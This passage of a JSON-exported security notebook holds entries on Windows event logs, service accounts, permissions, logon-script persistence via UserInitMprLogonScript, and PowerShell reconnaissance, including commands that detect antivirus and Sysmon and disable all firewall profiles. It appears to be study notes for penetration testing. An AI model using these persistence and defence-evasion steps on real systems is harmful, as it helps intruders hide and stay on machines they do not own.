applications.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h2 id=&quot;log-fields&quot;&gt;Log fields&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#log-fields&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;ul&gt;\n&lt;li&gt;Type — Warning, error, information, etc.&lt;/li&gt;\n&lt;li&gt;Time — Date/time for the computer &lt;em&gt;sending&lt;/em&gt; the log&lt;/li&gt;\n&lt;li&gt;Computer — Computer name&lt;/li&gt;\n&lt;li&gt;Provider Type — The facility that generated the event (generally the Windows Event Log)&lt;/li&gt;\n&lt;li&gt;Provider Name — The name of the log (Application, Security, etc.)&lt;/li&gt;\n&lt;li&gt;Source — Application&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Windows-event-IDs&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Windows-event-IDs&quot;&gt;Event ID&lt;/a&gt; — Standardized (&lt;em&gt;not&lt;/em&gt; unique!) identifier&lt;/li&gt;\n&lt;li&gt;Description — Self-explanatory&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/eventlog/eventlog-key&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Microsoft has more detailed documentation.&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/p&gt;\n&lt;h2 id=&quot;event-types&quot;&gt;Event types&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#event-types&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;ul&gt;\n&lt;li&gt;Error — An event that indicates a significant problem such as loss of data or loss of functionality. For example, if a service fails to load during startup, an Error event is logged.&lt;/li&gt;\n&lt;li&gt;Warning — An event that is not necessarily significant, but may indicate a possible future problem. For example, when disk space is low, a Warning event is logged. If an application can recover from an event without loss of functionality or data, it can generally classify the event as a Warning event.&lt;/li&gt;\n&lt;li&gt;Information — An event that describes the successful operation of an application, driver, or service. For example, when a network driver loads successfully, it may be appropriate to log an Information event. Note that it is generally inappropriate for a desktop application to log an event each time it starts.&lt;/li&gt;\n&lt;li&gt;Success Audit — An event that records an audited security access attempt that is successful. For example, a user’s successful attempt to log on to the system is logged as a Success Audit event.&lt;/li&gt;\n&lt;li&gt;Failure Audit — An event that records an audited security access attempt that fails. For example, if a user tries to access a network drive and fails, the attempt is logged as a Failure Audit event.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/eventlog/event-types&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Microsoft has more detailed documentation.&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/p&gt;\n&lt;h2 id=&quot;event-ids&quot;&gt;Event IDs&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#event-ids&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;Windows-event-IDs&quot; data-block=&quot;&quot; data-embed-alias=&quot;Windows event IDs&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Windows-event-IDs&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/Windows-event-IDs&quot;&gt;Transclude of Windows-event-IDs&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;"},"spells/Windows-local-service-accounts":{"slug":"spells/Windows-local-service-accounts","filePath":"spells/Windows local service accounts.md","title":"Windows local service accounts","links":["spells/Windows-services"],"tags":["OS/Windows/Services"],"content":"\nLocalSystem — The account used by the OS itself; essentially more powerful than an normal user account in the Administrators group.\nLocal Service — The default account used by Windows services; it has minimal privileges and uses anonymous network connections.\nNetwork Service — Essentially the same as the Local Service user, but uses the OS (“computer”) credentials when authenticating over the network.\n","richContent":"&lt;ul&gt;\n&lt;li&gt;LocalSystem — The account used by the OS itself; essentially &lt;em&gt;more&lt;/em&gt; powerful than an normal user account in the Administrators group.&lt;/li&gt;\n&lt;li&gt;Local Service — The default account used by &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Windows-services&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Windows-services&quot;&gt;Windows services&lt;/a&gt;; it has minimal privileges and uses anonymous network connections.&lt;/li&gt;\n&lt;li&gt;Network Service — Essentially the same as the Local Service user, but uses the OS (“computer”) credentials when authenticating over the network.&lt;/li&gt;\n&lt;/ul&gt;"},"spells/Windows-logon-scripts":{"slug":"spells/Windows-logon-scripts","filePath":"spells/Windows logon scripts.md","title":"Windows logon scripts","links":[],"tags":["OS/Windows/UserInit","OS/Windows/Registry","AttackCycle/Exploitation","AttackCycle/PrivEsc"],"content":"The userinit.exe binary checks for an environment variable called UserInitMprLogonScript. This variable isn’t set by default, but if defined then userinit.exe will run any script it specifies.\nUnfortunately, there’s no way to set this globally — you have to do it one user at a time in the HKCU\\Environment Registry key. Just create a new Expandable String Value entry called UserInitMprLogonScript in this key that points to the location of your payload.","richContent":"&lt;p&gt;The userinit.exe binary checks for an environment variable called UserInitMprLogonScript. This variable isn’t set by default, but if defined then userinit.exe will run any script it specifies.&lt;/p&gt;\n&lt;p&gt;Unfortunately, there’s no way to set this globally — you have to do it one user at a time in the &lt;code&gt;HKCU\\Environment&lt;/code&gt; Registry key. Just create a new Expandable String Value entry called UserInitMprLogonScript in this key that points to the location of your payload.&lt;/p&gt;"},"spells/Windows-permissions":{"slug":"spells/Windows-permissions","filePath":"spells/Windows permissions.md","title":"Windows permissions","links":["spells/UNIX-permissions"],"tags":["OS/Windows/Permissions","OS/Linux/Permissions"],"content":"Windows access is default-deny.\nWindows folder permissions:\n\nRead — Permits viewing and listing of files and subfolders\nWrite — Permits adding of files and subfolders\nRead &amp; Execute — Permits viewing and listing of files and subfolders as well as executing of files; inherited by files and folders\nList Folder Contents — Permits viewing and listing of files and subfolders as well as executing of files; inherited by folders only\nModify — Permits reading and writing of files and subfolders as well as executing of files; allows deletion of the folder\nFull Control — Permits reading, writing, changing, and deleting of files and subfolders\n\nWindows file permissions:\n\nRead — Permits viewing or accessing of the file’s contents\nWrite — Permits writing to a file\nRead &amp; Execute — Permits viewing and accessing of the file’s contents as well as executing of the file\nList Folder Contents — N/A\nModify — Permits reading and writing of the file as well as executing of the file; allows deletion of the file\nFull Control — Permits reading, writing, changing and deleting of the file\n\nThe biggest differences between Windows and UNIX permissions:\n\nWindows doesn’t have as fine-grained of control for a given user or group.\nWindows has much more fine-grained control across users and groups (there’s no limit of three permission sets).\nThe ability to delete a folder or file, and to change its permissions, are essentially considered to be distinct “sub-permissions”.\n\nAs much as it pains me to say it, in many ways the Windows permission mode is much better than the (pre-ACL) Linux model.","richContent":"&lt;p&gt;Windows access is default-deny.&lt;/p&gt;\n&lt;p&gt;Windows folder permissions:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;Read — Permits viewing and listing of files and subfolders&lt;/li&gt;\n&lt;li&gt;Write — Permits adding of files and subfolders&lt;/li&gt;\n&lt;li&gt;Read &amp;#x26; Execute — Permits viewing and listing of files and subfolders as well as executing of files; inherited by files and folders&lt;/li&gt;\n&lt;li&gt;List Folder Contents — Permits viewing and listing of files and subfolders as well as executing of files; inherited by folders only&lt;/li&gt;\n&lt;li&gt;Modify — Permits reading and writing of files and subfolders as well as executing of files; allows deletion of the folder&lt;/li&gt;\n&lt;li&gt;Full Control — Permits reading, writing, changing, and deleting of files and subfolders&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Windows file permissions:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;Read — Permits viewing or accessing of the file’s contents&lt;/li&gt;\n&lt;li&gt;Write — Permits writing to a file&lt;/li&gt;\n&lt;li&gt;Read &amp;#x26; Execute — Permits viewing and accessing of the file’s contents as well as executing of the file&lt;/li&gt;\n&lt;li&gt;List Folder Contents — N/A&lt;/li&gt;\n&lt;li&gt;Modify — Permits reading and writing of the file as well as executing of the file; allows deletion of the file&lt;/li&gt;\n&lt;li&gt;Full Control — Permits reading, writing, changing and deleting of the file&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;The biggest differences between Windows and &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/UNIX-permissions&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/UNIX-permissions&quot;&gt;UNIX&lt;/a&gt; permissions:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;Windows doesn’t have as fine-grained of control &lt;em&gt;for a given user or group&lt;/em&gt;.&lt;/li&gt;\n&lt;li&gt;Windows has &lt;em&gt;much more&lt;/em&gt; fine-grained control across users and groups (there’s no limit of three permission sets).&lt;/li&gt;\n&lt;li&gt;The ability to delete a folder or file, and to change its permissions, are essentially considered to be distinct “sub-permissions”.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;As much as it pains me to say it, in many ways the Windows permission mode is much better than the (pre-ACL) Linux model.&lt;/p&gt;"},"spells/Windows-reconnaissance-with-PowerShell":{"slug":"spells/Windows-reconnaissance-with-PowerShell","filePath":"spells/Windows reconnaissance with PowerShell.md","title":"Windows reconnaissance with PowerShell","links":[],"tags":["OS/Windows/ActiveDirectory","OS/Windows/Firewall","Application/PowerShell","OS/Windows","AttackCycle/Reconnaissance","OS/Windows/EventLog","OS/Windows/Services"],"content":"There are a lot of PowerShell commands that can be used for enumerating Windows.\n# List all AD users (IFF the machine is joined to a domain!)\n#\nGet-ADUser -Filter *\n \n# List AD users within a particular LDAP subtree\n#\nGet-ADUser -Filter * -SearchBase &quot;CN=Users,DC=example,DC=com&quot;\n \n# Enumerate antivirus\n#\nGet-CimInstance -Namespace root/SecurityCenter2 `\n                -ClassName AntivirusProduct\n \n# Check if the Windows Defender service is running\n#\nGet-Service WinDefend\n \n# Check if real-time protection is enabled for Windows\n# Defender\n#\nGet-MpComputerStatus | select RealTimeProtectionEnabled\n \n# Get information about potential threats recently detected by\n# Windows Defender\n#\nGet-MpThreat\n \n# Check the status of the Windows Firewall\n#\nGet-NetFirewallProfile | Format-Table Name,Enabled\n \n# Disable all WIndows Firewall profiles\n#\nSet-NetFirewallProfile -Profile Domain,Public,Private `\n                       -Enabled False\n \n# List Windows Firewall rules\n#\nGet-NetFirewallRule | select DisplayName,Enabled,Description\n \n# Two ways to check if a port can be connected to (the first\n# provides more output, while the second is more suitable for\n# scripting)\n#\nTest-NetConnection -ComputerName $IP_OR_HOSTNAME -Port $PORT\n \n(New-Object System.Net.Sockets.TcpClient(&quot;$IP_OR_HOSTNAME&quot;, &quot;$PORT&quot;)).Connected\n \n# List all current Windows logs\n#\nGet-EventLog -List\n \n# Sysmon is dangerous for an attacker! Three ways to check if\n# it&#039;s running...\n#\nGet-Process | Where-Object { $_.ProcessName -eq &quot;Sysmon&quot; }\n \nGet-CimInstance win32_service `\n\t-Filter &quot;Description = &#039;System Monitor service&#039;&quot;\n \nGet-Service | where-object {$_.DisplayName -like &quot;sysm&quot;}\n \n# List hidden directories\n#\nGet-ChildItem -Hidden -Path $SOME_PATH\n \n# Get a process with a particular &quot;image name&quot; (generally example.exe has an image name of &quot;example&quot;)\n#\nGet-Process -Name $IMAGE_NAME\nWhen checking to see if Sysmon is running, you can also examine the HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Sysmon\\Operational Registry entry.\nPowerShell Command History\nView PowerShell’s history.\ntype $Env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\nUse %USERPROFILE% instead of $Env:USERPROFILE if running from cmd.exe.","richContent":"&lt;p&gt;There are &lt;em&gt;a lot&lt;/em&gt; of PowerShell commands that can be used for enumerating Windows.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# List all AD users (IFF the machine is joined to a domain!)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Get-ADUser&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Filter &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;*&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# List AD users within a particular LDAP subtree&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Get-ADUser&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Filter &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;*&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;SearchBase &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;CN=Users,DC=example,DC=com&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Enumerate antivirus&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Get-CimInstance&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Namespace root&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;SecurityCenter2 &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;`&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;ClassName AntivirusProduct&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Check if the Windows Defender service is running&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Get-Service&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; WinDefend&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Check if real-time protection is enabled for Windows&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Defender&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Get-MpComputerStatus&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; select RealTimeProtectionEnabled&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Get information about potential threats recently detected by&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Windows Defender&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Get-MpThreat&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Check the status of the Windows Firewall&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Get-NetFirewallProfile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt; Format-Table&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; Name&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Enabled&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Disable all WIndows Firewall profiles&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Set-NetFirewallProfile&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Profile Domain&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Public&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Private &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;`&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                       -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Enabled False&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# List Windows Firewall rules&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Get-NetFirewallRule&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; select DisplayName&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Enabled&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Description&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Two ways to check if a port can be connected to (the first&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# provides more output, while the second is more suitable for&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# scripting)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Test-NetConnection&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;ComputerName &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;IP_OR_HOSTNAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Port &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;PORT&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;New-Object&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; System.Net.Sockets.TcpClient&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;IP_OR_HOSTNAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;))&lt;/span&gt;&lt;span 